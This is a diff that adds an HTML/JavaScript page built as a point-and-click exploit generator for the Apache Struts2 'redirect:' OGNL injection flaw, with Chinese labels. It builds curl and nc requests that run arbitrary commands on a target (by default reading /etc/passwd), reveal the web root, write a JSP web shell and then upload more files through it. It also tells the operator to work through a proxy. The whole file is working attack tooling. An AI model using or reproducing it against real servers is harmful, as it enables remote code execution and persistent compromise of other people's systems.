@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Untitled Document</title>
+</head>
+网址:<input id="url" style='width:400px'>wait:<input type="checkbox" id="wait"/> error:<input type="checkbox" id="error"/> <br><br>
+命令:<input id="cmd" style='width:370px' value="cat /etc/passwd"><br>
+shell路径: <input type="text" id="shellName" value="css.jsp" /><br>
+shell 内容：<textarea  id="shellContent" cols="90" rows="5"><%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes("UTF-8"));%></textarea>
+<br>
+POST上传到文件名: <input type="text" id="postshellName" value="css.backup.jsp" /><br>
+postshell 内容：<textarea  id="postshellContent" cols="90" rows="10"></textarea>
+
+<hr>
+<button onclick="gogogo()">走你</button><br><br>
+<div id="result"></div>
+<script>
+function gogogo(){
+	var url=document.getElementById("url").value;	
+	var cmd=document.getElementById("cmd").value.split(" ");
+	var cmds="";
+	for(var i in cmd)cmds+=",'"+cmd[i]+"'";
+	var html="<br>命令<br><pre>curl -v \""+url+"?redirect";
+	var enc=":${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"+(cmds.length>1?cmds.substr(1):"")+"})).start(),"+(document.getElementById("wait").checked?"#a.waitFor(),":"")+"#b=#a.get"+(document.getElementById("error").checked?"Error":"Input")+"Stream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}";
+	html+=encodeURIComponent(enc)+"\"</pre><br>路径<br><pre>curl -v \""+url+"?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D\"</pre>";
+
+	var idx=url.indexOf("/");
+	var host=url.substr(idx+2,url.indexOf("/",idx+2)-idx-2);
+	html+="GET方式上传：<pre>nc -v "+host+" 80<pre>";
+
+	html+="nc内容：<pre>GET "+url.substr(url.indexOf("/",idx+2))+"?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22"+document.getElementById("shellName").value+'%22).replaceAll("\\\\\\\\",%20"/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c='+encodeURIComponent(document.getElementById("shellContent").value)+' HTTP/1.1\r\nHost: '+host+"</pre>";
+	html+="测试是否写文件成功：<pre>curl -v "+(url.substr(0,url.lastIndexOf("/")+1))+document.getElementById("shellName").value+"</pre>";
+	html+="POST文件上传：<pre>curl -v "+(url.substr(0,url.lastIndexOf("/")+1))+document.getElementById("shellName").value+"?f="+document.getElementById("postshellName").value+" -d \"t="+encodeURIComponent(document.getElementById("postshellContent").value)+"\"</pre>";
+
+html+="htmlpost浏览器上传：记住一定要用代理：<br><pre>&lt;form action=&quot;"+(url.substr(0,url.lastIndexOf("/")+1))+document.getElementById("shellName").value+"?f="+document.getElementById("postshellName").value+"&quot; method=&quot;post&quot;&gt;&lt;textarea name=t cols=120 rows=10 width=45&gt;your code&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br&gt;&lt;input type=submit value=&quot;go&quot;&gt;&lt;/form&gt;</pre>"
+	document.getElementById("result").innerHTML=html.replace(/!/gm,"%21");//.replace(/\$/gm,"%24").replace(/{/gm,"%7b").replace(/}/gm,"%7d");
+	
+}
+</script>
+<body>
+</body>
+</html>
